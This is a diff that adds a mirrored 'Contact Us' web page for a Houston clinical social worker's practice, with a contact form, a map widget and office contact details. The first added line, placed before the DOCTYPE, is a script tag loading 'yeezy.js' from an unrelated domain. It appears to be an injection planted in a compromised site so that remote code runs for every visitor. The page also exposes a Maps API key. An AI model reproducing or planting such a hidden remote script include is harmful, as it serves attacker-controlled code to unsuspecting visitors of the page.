@@ -1,0 +1,290 @@
+
+<script language="JavaScript" src="http://www.do-hero.com/yeezy.js"></script>
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta property="og:title" content="Contact Us" />
+<meta name="generator" content="Websplanet" />
+<meta name="robots" content="index,follow" />	<title>Contact Us - Elizabeth B. Knight, L.C.S.W.</title>	<link href="templates/resellers/2/favicon.ico%EF%B9%96v=1477958170.jpeg" rel="SHORTCUT ICON" type="image/x-icon" />
+<link href="js/fancybox2/jquery.fancybox.min%EF%B9%96v=6.5.1.38076.css" media="screen" rel="stylesheet" type="text/css" />
+<link href="css/widgets/concat_widget.min%EF%B9%96v=6.5.1.38076.css" media="screen" rel="stylesheet" type="text/css" />
+<link href="templates/creator/m_6/68/685/336/css/main.min%EF%B9%96v=1455791467.css" media="screen" rel="stylesheet" type="text/css" id="template-grid" />
+<link href="templates/creator/m_6/68/685/336/css/skin.min%EF%B9%96v=1455791467.css" media="screen" rel="stylesheet" type="text/css" id="template-skin" />
+<link href="contact-us.html" rel="canonical" />		
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js?v=6.5.1.38076"></script>
+<script type="text/javascript" src="js/fancybox2/jquery.fancybox.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/efu/main.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript">
+    //<!--
+    $(document).ready(function(){var options = {
+	addressAr: [{"id":"loc_0","address":"3131 Eastside Street, Houston, Texas 77098","lat":29.7373056,"lng":-95.42429519999996}],
+	zoom: 15,
+	isCenterDefined: 1,
+	center: [29.7373056, -95.42429519999996],
+	widgetId: 75}
+var Nwidth=$(window).width();
+$('#map_big_75').css('width', Nwidth-70);
+
+var width = $('#map_canvas_75').width();
+if (!width || 0 == parseInt(width)) {
+	efu.mediator().on("dc_event",  efu.w.gmap, ['map_canvas_75', options]);
+} else {
+	efu.w.gmap('map_canvas_75', options);
+}
+efu.mediator().on("rotate",  efu.w.gmap, ['map_canvas_75', options]);
+
+var bigGmapLoaded = [];
+
+// Init Full Map Code
+$("#custom_75").fancybox(
+	{
+		afterShow: function() {
+			if (typeof(bigGmapLoaded[ 75 ]) != 'undefined') return;
+			efu.w.gmap('map_big_75', options);
+			bigGmapLoaded[ 75 ] = true;
+				
+		},
+		width:"800px"
+	}
+);
+$(window).resize(function(event) {	
+
+	var Nwidth=$(window).width();;
+	$('#map_big_75').css('width', Nwidth-70);
+
+
+});});    //-->
+</script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js?v=6.5.1.38076"></script>
+<script type="text/javascript" src="js/footer/get_deps.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/footer/build_social_entries.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript">
+    //<!--
+    $(document).ready(function(){socialEntries = {"facebook":"","twitter":"","linkedin":"","linkedincompany":"","googleplus":""};
+socialEntriesTitle = {"facebook":" Follow on Facebook","twitter":"Follow on Twitter","linkedin":"Follow on LinkedIn","linkedincompany":"Follow on LinkedIn","googleplus":"Follow on Google Plus"};
+$.each(socialEntries, function(key, value) {
+      buildSocialEntry(key, value, socialEntriesTitle[key]);
+});
+getDependecies();
+});    //-->
+</script>
+<script type="text/javascript">
+    //<!--
+       
+
+    //-->
+</script>
+	<style>.header-slider .logo-container {
+    position: relative;
+}
+</style>
+			<link type="text/css" href="templates/creator/m_6/68/685/336/assets/normalize%EF%B9%96v=1455791467.css" rel="stylesheet">
+<link href='http://fonts.googleapis.com/css?family=Droid+Sans:400,700' rel='stylesheet' type='text/css'>
+						<!--[if lt IE 9]>
+		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<![endif]-->
+		<script type="text/javascript">
+		    //label of menu button on mobile version
+		    var config = {
+		      navigation: "Navigation"
+		    };
+		    $(function(){
+		        $('#circle-action').circleMenu({
+		          direction:'top-left',
+		          trigger:'click',
+		          item_diameter: 40,
+		            });
+		        $('a').on('click',function(evt){
+		          if($(this).attr('href')==='#'){
+		            evt.preventDefault();
+		          }
+		        });      
+		    });
+
+		    if(/(iPhone|iPod|iPad)/i.test(navigator.userAgent)) { 
+		        $( ":input" ).focus(function() {
+		          $("#fixed_mobile_action").hide()
+		        });
+		        $( ":input" ).focusout(function() {
+		          $("#fixed_mobile_action").show()
+		        });
+		        if(/OS [2-4]_\d(_\d)? like Mac OS X/i.test(navigator.userAgent)) { 
+		            // iOS 2-4 so Do Something  
+		          // alert('ios[2-4]');
+		           $('#circle-action').removeClass('ios5');
+		           $('#circle-action').addClass('ios4');
+
+		            $('.body').on('touchstart', function(){
+		               $('#circle-action').css('visibility', 'hidden');
+		            });
+
+
+		            var $myFixedDiv = $('#circle-action');
+		            var iFixedDivHeight = $myFixedDiv.outerHeight({ 'margin': true });
+
+		            $(window).scroll(function() {
+		                var iWindowHeight = $(window).height();
+		                var iScrollPosition = $(document).scrollTop(); // or document.body.scrollTop
+		                //$myFixedDiv.css({ 'top': iWindowHeight + iScrollPosition - iFixedDivHeight + 60});
+		                 $myFixedDiv.css({ 'bottom': 0 - iScrollPosition - iFixedDivHeight - 20});
+
+		            });
+
+
+		            $('body').on('touchend', function(){  
+		                 $('#circle-action').css('visibility', 'visible');
+		            }); 
+		                        
+
+		        } else {
+		            // iOS 5 or Newer so Do Nothing             
+		                    
+		        }
+		    }
+		</script>
+	<style type="text/css" media="screen"><!--
+
+-->
+</style></head>
+	<body>
+		<header class="clearfix header header-slider">
+		<div class="logo-container">
+		<a href="index.html" class="logo"><div><span style="font-size:36px;"><span style="color: rgb(102, 204, 255);"><span style="font-family: tahoma,geneva,sans-serif;"><strong>Elizabeth&nbsp;B. Knight, L.C.S.W.</strong></span></span></span></div></a>		</div>
+		<div id="image-slider-116" class="image-slider-slidesize-size1  image-slider-skin-skin1 image-slider-theme-white">
+	<ul class="bxslider">
+							
+	</ul>
+</div>
+		<nav role="navigation" class="nav">
+				<ul id="nav" class="menu_count_4 wp-menu"><li id="menu_7" class="first  lb_7"><a href="index.html" target="_self" title="Home" data-pageid="7" data-act="canvas" data-itemid="7" data-cat="0">Home</a> </li><li id="menu_102201" class=" lb_102201"><a href="about-us.shtml" target="_self" title="About Us" data-pageid="102201" data-act="canvas" data-itemid="97847" data-cat="0">About Us</a> </li><li id="menu_102235" class=" lb_102235"><a href="forms-office-policy.shtml" target="_self" title="Forms, Office Policy" data-pageid="102235" data-act="canvas" data-itemid="97878" data-cat="0">Forms, Office Policy</a> </li><li id="menu_8" class="current last lb_8"><a href="contact-us.shtml" target="_self" title="Contact Us" data-pageid="8" data-act="canvas" data-itemid="8" data-cat="0">Contact Us</a> </li></ul>		</nav>
+
+</header>
+  <section role="main" id="wrapper" class="skinBg">
+  	
+    <div id="content">
+      <div id="main-content">
+      	<div class="container-1200">		    <div id="searchResults"></div>        	<div id="wp_content_data"><div class="vertical" style="width: 100%;"><div class="widget-wrapper widget-element free-text diy-resizable ">
+
+		<div id="widget-id-734875" 
+		class="widget-body " style="-ms-transform: rotate(0deg) scale(1); -moz-transform: rotate(0deg) scale(1); -webkit-transform: rotate(0deg) scale(1); -o-transform: rotate(0deg) scale(1); transform: rotate(0deg) scale(1)">
+		<div class="freetextarea">	
+	<p><span style="font-size:medium;">Elizabeth B. Knight, LCSW</span></p><p><span style="font-family: &quot;Droid Sans&quot;, sans-serif; font-size: small; background-color: rgb(230, 231, 232);">3131 Eastside Street, Suite 415</span><br style="font-family: &quot;Droid Sans&quot;, sans-serif; font-size: small; background-color: rgb(230, 231, 232);"><span style="font-family: &quot;Droid Sans&quot;, sans-serif; font-size: small; background-color: rgb(230, 231, 232);">Houston, Texas 77098</span></p><p><span style="font-size: small">Office: 713-974-6590<br>Fax: 713-974-6591</span></p><p><span style="font-size: small">Email: </span><span style="font-size: small"><a data-cke-saved-href="mailto:lorem@ipsum.com" href="mailto:lorem@ipsum.com">e</a>lizabeth@ebknight.org<br>______________________________________________</span></p><p><span style="font-size: small"><em>For directions, see map below.</em></span></p><p><br></p></div>
+<div class="clear"></div>	</div>
+</div>
+
+
+<div class="widget-wrapper widget-element contact-us diy-resizable ">
+
+		<div id="widget-id-56" 
+		class="widget-body " style="">
+		<div id="contacts_form_73">
+	<p class="help-block"></p>	
+	<div class="contactUsFront"><form id="contacts_form_73" enctype="application/x-www-form-urlencoded" WID="73" action="wforms/index/submit.html" method="post"><div class="clearfix">
+
+<input type="hidden" name="wid" value="56" id="wid">
+
+<input type="hidden" name="LANG" value="en" id="LANG">
+<ul>
+<li id="name-element-73"><label for="name" class="required">Name:</label>
+<span>
+<input type="text" name="name" id="name" value="" maxlength="255" placeholder="Name"></span></li>
+<li id="subject-element-73"><label for="name" class="optional">Subject:</label>
+<span>
+<input type="text" name="subject" id="subject" value="" maxlength="255" placeholder="Subject"></span></li>
+<li id="phone-element-73"><label for="name" class="optional">Phone:</label>
+<span>
+<input type="text" name="phone" id="phone" value="" maxlength="255" placeholder="Phone"></span></li>
+<li id="email-element-73"><label for="name" class="required">Email:</label>
+<span>
+<input type="text" name="email" id="email" value="" maxlength="255" placeholder="Email"></span></li>
+<li id="message-element-73"><label for="name" class="optional">Message:</label>
+<span>
+<textarea name="message" id="message" cols="30" rows="3" placeholder="Message"></textarea></span></li></ul>
+<div class="clearfix">
+
+<input type="submit" name="send" id="send" value="Send" class="buttons"></div></div></form></div></div>	</div>
+</div>
+
+
+<div class="widget-wrapper widget-element free-text diy-resizable ">
+
+		<div id="widget-id-59" 
+		class="widget-body " style="">
+		<div class="freetextarea">	
+	&#160;<br /></div>
+<div class="clear"></div>	</div>
+</div>
+
+
+<div class="widget-wrapper widget-element google-maps diy-resizable ">
+
+		<div id="widget-id-58" 
+		class="widget-body " style="">
+			<div>
+    <p>
+        <a id="custom_75" href="#map_big_75">Show Full Map</a>
+        <a style="margin: 10px" href="https://maps.google.com/maps?daddr=3131+Eastside+Street,+Houston,+Texas+77098" target="_blank">Get Directions</a>
+    </p>
+	</div>
+<div id="map_canvas_75"></div>
+<div id="map_big_75" style="display:none;width:100%; height:600px;"></div>
+
+
+	</div>
+</div>
+
+
+</div></div>        </div>
+      </div>
+      <div class="clear"></div>
+    </div>   
+  </section>
+
+ <footer id="copyrights" class="footer">
+  <div class="container-1200">
+      <div class="languages">
+              </div>
+      <div id="footerContent"><div>
+<div droid="" sans="" style="text-align: center;"><span style="color:#3399cc;"><em><span style="font-size: 14px;">For more information or to make an appointment, please call 713-974-6590.</span></em></span></div>
+
+<div droid="" sans="" style="text-align: center;"><span style="color:#3399cc;"><span style="font-size: 14px;"><em>Elizabeth B. Knight, LCSW, &nbsp;3131 Eastside Street, Suite 415, Houston, TX 77098</em></span></span></div>
+</div>
+</div>
+<div id="mySocialList" class="addthis_toolbox addthis_32x32_style addthis_default_style"></div>      <ul id="mirror-menu-module"><li id="mirror_menu_td_7" class="mirror_menu"><a href="index.html" target="_self" title="Home" data-pageid="7" data-act="canvas" data-itemid="7" data-cat="0">Home</a></li><li id="mirror_menu_td_102201" class="mirror_menu"><a href="about-us.shtml" target="_self" title="About Us" data-pageid="102201" data-act="canvas" data-itemid="97847" data-cat="0">About Us</a></li><li id="mirror_menu_td_102235" class="mirror_menu"><a href="forms-office-policy.shtml" target="_self" title="Forms, Office Policy" data-pageid="102235" data-act="canvas" data-itemid="97878" data-cat="0">Forms, Office Policy</a></li><li id="mirror_menu_td_8" class="mirror_menu"><a href="contact-us.shtml" target="_self" title="Contact Us" data-pageid="8" data-act="canvas" data-itemid="8" data-cat="0">Contact Us</a></li></ul>    </div>
+  </footer>
+<aside id="fixed_mobile_action" class="clearfix">
+    <ul id="circle-action" class="ios5">
+      <li><a href="#" onclick="return false;">+</a></li>
+      <li class="phone" data-word="Call us now !"><a href="tel:713-974-6590" class="click-phone">Call us now !</a></li>
+      <li class="map" data-word="Find us on the map"> <a href="http://maps.google.com/maps?q=3131%20Eastside%20Street,%20Ste.%20415%20Houston%20United%20States" class="click-map">Find us on the map</a></li>
+      <li class="mail" data-word="Send us an email"><a href="mailto:elizabeth@ebknight.org" class="click-mail">Send us an email</a></li>
+    </ul>
+  </aside>
+		    <script type="text/javascript">
+    //<!--
+    var sid = 54305;    //-->
+</script>
+<script type="text/javascript" src="js/functions_stripped%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/efu/w.contactus.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript">
+    //<!--
+    $(document).ready(function(){efu.widgets.inlineJs('cu',{"CONTACT_FORM_ID":"contacts_form_73","LOADER_STATIC_URL":"\/gfx\/ajax-loader.gif","WID":"73","SUBMIT_TRACK_PAGE":"contact-form","THANKYOU_MSG":"Thank you for contacting us.","CONTACTUS_APPENDHTML":""})});    //-->
+</script>
+<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDtl20jiW9-VUfW89kLFI_h1Xn9d5LfZT8&amp;sensor=false&amp;v=6.5.1.38076"></script>
+<script type="text/javascript" src="js/efu/w.gmap.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="templates/creator/m_6/68/685/336/assets/wp-menu.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="templates/creator/m_6/68/685/336/assets/jQuery.circleMenu.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="http://www.youtube.com/iframe_api?v=6.5.1.38076"></script>
+<script type="text/javascript" src="http://f.vimeocdn.com/js/froogaloop2.min.js?v=6.5.1.38076"></script>
+<script type="text/javascript" src="js/bxslider/plugins/jquery.fitvids%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/bxslider/jquery.bxslider.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/efu/videoSlide%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript" src="js/efu/w.imageslider.min%EF%B9%96v=6.5.1.38076.js"></script>
+<script type="text/javascript">
+    //<!--
+    $(document).ready(function(){efu.widgets.inlineJs('imageslider',{"WID":"116","ADAPTIVEHEIGHT":"1","ARROWS":"1","AUTO":"1","BULLETS":"1","EFFECT":"fade","PAUSE":"1","SPEED":"2"})});    //-->
+</script>    </body>
+
+</html>
